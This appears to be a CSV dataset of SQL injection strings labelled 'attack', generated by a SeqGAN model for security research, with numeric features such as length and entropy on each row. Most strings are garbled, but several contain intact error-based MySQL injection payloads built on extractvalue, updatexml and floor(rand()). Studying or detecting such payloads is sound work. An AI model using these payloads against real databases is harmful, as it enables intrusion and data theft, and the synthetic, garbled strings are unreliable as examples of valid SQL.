attack,"1"" r  )  ),0x717a767a71l   9173   (  )   thenextractvalue  106  )   0x717a767a71   ( hr  (  ||chr  (  113  ,floor  (  ||chr group m =  ||cr  (   )    )   x from when when   (  ||r  (  ||chr  =  )  )  113  ||dWv chr  (  ||chr  (  =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235,234.0,33.0,3.7441715079470446,71.0,32.0,91.0,40.0,0.3034188034188034,0.13675213675213677,0.3888888888888889,0.17094017094017094,0.0,1.0,2.0,0.0,0.0,3.0,0.0,18.0,0.0,0.0,2.0,19.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"15305aychr.rosniead_inttoys  (  ||chl  adr.n  )   x      )    ,floor  )     )    )   then or FROM hr  (  case   FROM  ( having concat  )  ||chhr  (  =  #   )     =  select 0 select end  then 1  ASR%hrs  (  ,  select group D sx.s a   x information_schemaNT  (  =  =   0 WHERE RAMICCT  *x.x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236,288.0,49.0,4.21362588914507,144.0,8.0,104.0,32.0,0.5,0.027777777777777776,0.3611111111111111,0.1111111111111111,0.0,0.0,0.0,0.0,1.0,4.0,0.0,13.0,1.0,2.0,2.0,9.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1floorh%%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'tjx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237,309.0,41.0,4.091519751977094,111.0,55.0,109.0,34.0,0.3592233009708738,0.1779935275080906,0.35275080906148865,0.11003236245954692,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,2.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  "" 1 mE(Sunionhoxysnjueadretere__r  (  =     )  =  #,1   )       or select group || where  =  ||cho.sna else where 1210  select(  from WHERE when  (  ||chhr  5023  )  ||chr  select   (  #  having1  =  (  ||  uin  0 concat  113)  )  )  )    ,floor  )  select 1 ) 5192 bys  end  , 5192 1 1 *.",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238,596.0,50.0,4.159562850262985,225.0,81.0,217.0,73.0,0.3775167785234899,0.13590604026845637,0.3640939597315436,0.12248322147651007,0.0,2.0,0.0,0.0,3.0,5.0,0.0,37.0,0.0,2.0,9.0,19.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,3.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,1'||  (  select 'yytul,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239,22.0,12.0,3.3862661425265332,11.0,1.0,5.0,5.0,0.5,0.045454545454545456,0.22727272727272727,0.22727272727272727,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select 'ywhtjzaraaxxuM' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'ventrkhr_teroe_rmamp.(      (  )  )  9325nadr_Nr  (  0  ||chr  (  6825  )  (  ,0x717a767a71,floor  (  =  =  0x7171706a71n,floorr  =  )   and   (  ,select FROM 0  || when 6055  =  ,concat0x717a767a71i  )   x tualacr  =  (  )     andhe.s  (  (  select when   (  ||chr  (  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240,480.0,46.0,4.228305237898235,164.0,89.0,159.0,68.0,0.3416666666666667,0.18541666666666667,0.33125,0.14166666666666666,4.0,0.0,0.0,0.0,0.0,7.0,0.0,31.0,0.0,3.0,11.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"11  ab  rand  )  )  ||aselect hr  (  )  )   113  )      ,  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241,60.0,19.0,2.947369831527588,15.0,5.0,30.0,10.0,0.25,0.08333333333333333,0.5,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"11"" DINT 1x LISe.r  (  (  (  =  4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242,36.0,18.0,3.458383575326725,10.0,7.0,13.0,6.0,0.2777777777777778,0.19444444444444445,0.3611111111111111,0.16666666666666666,0.0,1.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-('   0x717a767a71,0x717a767a71     ' end   )    rand concat  ||  aut  (  case whenWHERE FROM 1210,0x717a767a71andfloor  ||,  '  3440 else (  )  0   ,when 6237  )    ||chr  113  4510   (hra where 6913  )  )    C 9891 FROM then (  casent__riachr  (  8190,  0x7171706a71,concat  9067  ||chr  (  select SNAEIT(  ||chr  1045  ||M concat  0  0   then by 3785  1   FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243,363.0,49.0,4.386009781248282,133.0,84.0,109.0,37.0,0.36639118457300274,0.23140495867768596,0.3002754820936639,0.10192837465564739,3.0,0.0,1.0,0.0,0.0,0.0,0.0,13.0,0.0,2.0,6.0,13.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1'||  (  select 'Iyx""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244,27.0,15.0,3.4019495387197347,9.0,1.0,9.0,8.0,0.3333333333333333,0.037037037037037035,0.3333333333333333,0.2962962962962963,2.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'trSy'  =  'ti)    )    )    )     )     )(  )  )     )   )     )   from 2131 )    having from else WHERE D end  0   )     )     )      )     WHERE 0  1 end  )     )  ||chr.s  =  )   )           )    )   )  ) concat  a from 3931 d_r  (    ||chr  selecta dr  (  6825  ||chr  (  ||c  ||,  (  ||r  (  a else 0 else  1y R",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245,318.0,40.0,3.2922685492906885,86.0,18.0,164.0,50.0,0.27044025157232704,0.05660377358490566,0.5157232704402516,0.15723270440251572,3.0,0.0,0.0,0.0,0.0,2.0,0.0,30.0,0.0,1.0,1.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"15967  rand,      (  *2  SELECTchser  (  =  *     or)     )   WHEREy or else concat  *  selectx   FROM else from else",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246,117.0,38.0,3.958240918864952,58.0,6.0,44.0,9.0,0.49572649572649574,0.05128205128205128,0.37606837606837606,0.07692307692307693,0.0,0.0,0.0,0.0,3.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-'||  (  select 'u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247,18.0,11.0,3.1916116417513782,7.0,0.0,5.0,6.0,0.3888888888888889,0.0,0.2777777777777778,0.3333333333333333,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   SELECT1392 xIo.",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248,20.0,15.0,3.7219280948873625,9.0,5.0,4.0,2.0,0.45,0.25,0.2,0.1,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1wtuze9067ayju    TI.%u   4232   Sor or 3326  (    =  =  )    WHERE group end  ||chr  (  =  =  )     FROM  select by T WHEREchr  5840  ,1  ,concat  select from when h 1rop  (  (  ||chr  (  (  (  select 90671 from ddr  6082ounelt_dal_lt_axwtzyl       *2   SELECTy.s 5606 else FROM h 7158  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249,291.0,54.0,4.542443881056811,130.0,37.0,96.0,28.0,0.44673539518900346,0.12714776632302405,0.32989690721649484,0.09621993127147767,0.0,0.0,0.0,0.0,1.0,4.0,0.0,9.0,1.0,3.0,2.0,11.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'am    fromsg group union 1 concat  113  *2   (    )   then select group D group RO W  (  >  112  )  0  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250,283.0,40.0,3.7224108153526343,87.0,44.0,121.0,31.0,0.30742049469964666,0.15547703180212014,0.4275618374558304,0.10954063604240283,2.0,0.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,0.0,5.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"122%""  =  ""ia",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251,13.0,8.0,2.7773627950641693,2.0,3.0,4.0,4.0,0.15384615384615385,0.23076923076923078,0.3076923076923077,0.3076923076923077,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"Mxbn 1210  6237,and,concat  (  =  ,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252,36.0,19.0,3.814536459234778,13.0,9.0,9.0,5.0,0.3611111111111111,0.25,0.25,0.1388888888888889,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1_rintna' like '_tUwwuinmuun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253,28.0,16.0,3.8248629576173565,21.0,1.0,2.0,4.0,0.75,0.03571428571428571,0.07142857142857142,0.14285714285714285,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1',concat  0x4b774c75   (  =  )   x by end  )      ,  (  )  )  ,0x717a767a71,7562",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254,81.0,23.0,3.565089596836597,18.0,21.0,30.0,12.0,0.2222222222222222,0.25925925925925924,0.37037037037037035,0.14814814814814814,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1o7864112  (  4232  )   x      thenc,1 3440untm(  ,0x717a767a71,floor  selectaddradr   (  uselect 8488 D by AIelse information_schemaNU.eT  (  =  )     from then 3785 0 m LINCOWTo_osintunthr  0x7171706a718190  0  =     WHERE m   e when  (  (  case 0   (  ||ch5305(  =  )    )     then 1 when 6825)   )    )   )   : REROinformation_schemar.",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255,339.0,51.0,4.520474491138345,145.0,60.0,104.0,30.0,0.4277286135693215,0.17699115044247787,0.30678466076696165,0.08849557522123894,0.0,0.0,0.0,0.0,0.0,3.0,0.0,16.0,0.0,3.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-S""eltintchr  (  4232  4510  (  ,9173achthount  )   then'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ' union or or DIASr.r  (  )   then FROM else 0 d dbs 6237 Scase d  (  (  =  )  select   (  112  )     )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256,489.0,50.0,3.986219110906985,168.0,74.0,193.0,54.0,0.34355828220858897,0.15132924335378323,0.3946830265848671,0.11042944785276074,2.0,1.0,1.0,0.0,2.0,2.0,0.0,37.0,0.0,0.0,7.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,4.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,"1%113",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257,6.0,4.0,1.792481250360578,0.0,4.0,1.0,1.0,0.0,0.6666666666666666,0.16666666666666666,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"select information_schemaNCCT  selecteacrinna DINUC SNT(  select when WHERE FROM  (  ||chr  (  )  0  or FROM AND chr  s,   by when   (  4232  select WHERE end  ||,W  at h-  (  ( ),1     --  a 5192 group 1 1 1 end   ||  (  )  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258,229.0,51.0,4.44878236698212,117.0,13.0,74.0,25.0,0.5109170305676856,0.056768558951965066,0.3231441048034934,0.1091703056768559,0.0,0.0,3.0,0.0,0.0,1.0,0.0,10.0,0.0,1.0,3.0,10.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,2.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack," 1  whenohhuar_throS.gets chr  (  5023  *  ||p  )2   xv xxx.drehr   (   7158  case when   (  ||113  select WHERE or FROM when   6237  (  =  SELECT 'i'  =  (  || 4386  *   >hr  (  =  select or1 by   from   (  =  )   x x concat  ,  (  when  select 5192 1  0 end  4386 concat  (  )   0x5c     )    2   then 1 m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259,307.0,54.0,4.149967403897563,119.0,36.0,120.0,32.0,0.38762214983713356,0.11726384364820847,0.39087947882736157,0.10423452768729642,2.0,0.0,0.0,0.0,2.0,4.0,0.0,13.0,0.0,1.0,1.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1'||  (  select '9740xh_4386,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260,28.0,20.0,4.107010619399147,8.0,9.0,5.0,6.0,0.2857142857142857,0.32142857142857145,0.17857142857142858,0.21428571428571427,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-case or or else 4386  )   WHERE 1210  )     )  )     from 5584 FROM when   (  ||=  122  havingx group 0 group 5978 union or WHERE y enda unionconcat    ||  )  ||chr.(  (  (  4232  )  (  )a DINThro  =  (     (  )     and else mn     having group 1Ix..WooI.gygerestt_rdr  (    ||ct  (  0  select and 1  1,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261,303.0,50.0,4.283540439712224,134.0,28.0,108.0,33.0,0.44224422442244227,0.0924092409240924,0.3564356435643564,0.10891089108910891,0.0,0.0,1.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,0.0,11.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,2.0,2.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1""ado.selectad_na",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262,17.0,13.0,3.572469458770135,13.0,1.0,0.0,3.0,0.7647058823529411,0.058823529411764705,0.0,0.17647058823529413,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ' unionunzaliT  tm   )    (  )   4493  )  )   )   ()       )     (  )      )  e  )   from x whenia * end  ,7469  ||  (  0  ||ch'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'r,x.r  (  4232  >  select fromam benchmark  (  )  ,0x717a767a71  5023  1045  )     --   ),thenor chr  (  ||C  ||  (  =  e ,1  select from 3931   (   )    4232    ,12    4493  ||chr  0  select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263,827.0,47.0,3.7945864103467435,229.0,135.0,356.0,107.0,0.27690447400241835,0.16324062877871826,0.43047158403869407,0.1293833131801693,4.0,0.0,2.0,0.0,3.0,3.0,0.0,65.0,0.0,0.0,17.0,20.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""q0x717a767a7174690x717a767a71b",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264,493.0,41.0,3.8111267206795536,148.0,91.0,194.0,60.0,0.3002028397565923,0.1845841784989858,0.3935091277890467,0.12170385395537525,0.0,4.0,0.0,0.0,2.0,2.0,0.0,38.0,1.0,2.0,10.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"AND-  select 3785  1 5192 0x7171706a715305     0   WHERE end  )     )   x   3051 1 from   (  select else  ||chrhrhWr  (  ||chr  (  )  ||chrhr  (  113  )  >  extractvalue  =  (      )     x   FROM 0 (  chr  113  *2   )    )     )          )   =  (  )     having when   (  ||cu=t  =  (  (  ,  ,  0  )   orutau9173  )   extractvalue  ,   SELECT else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265,347.0,51.0,3.8172219597120858,111.0,42.0,154.0,40.0,0.31988472622478387,0.12103746397694524,0.4438040345821326,0.11527377521613832,0.0,0.0,1.0,0.0,1.0,4.0,0.0,22.0,0.0,0.0,3.0,15.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'||  (  select '.hr""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""w_.  0x7171706a71selectc 1 or by end  ||yl  112  0   3074    SELECT 3051 concat  select D fromhr  (  select :s end  having 6055  ,floor  extractvalue  0   )   then FROMouhavingd.garr.x  ,  6237  ||ctoszuntaleadr.chhr  (  select  from or113 select when   (   (  select concat  )    ,concat  )  ,1   and FROM or FROM  FROM 6055     (  1130x717a767a71,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266,569.0,55.0,4.246398435175695,231.0,85.0,197.0,56.0,0.40597539543058,0.14938488576449913,0.3462214411247803,0.0984182776801406,2.0,2.0,0.0,0.0,1.0,1.0,0.0,27.0,0.0,1.0,9.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,0.0,0.0,5.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,24.0
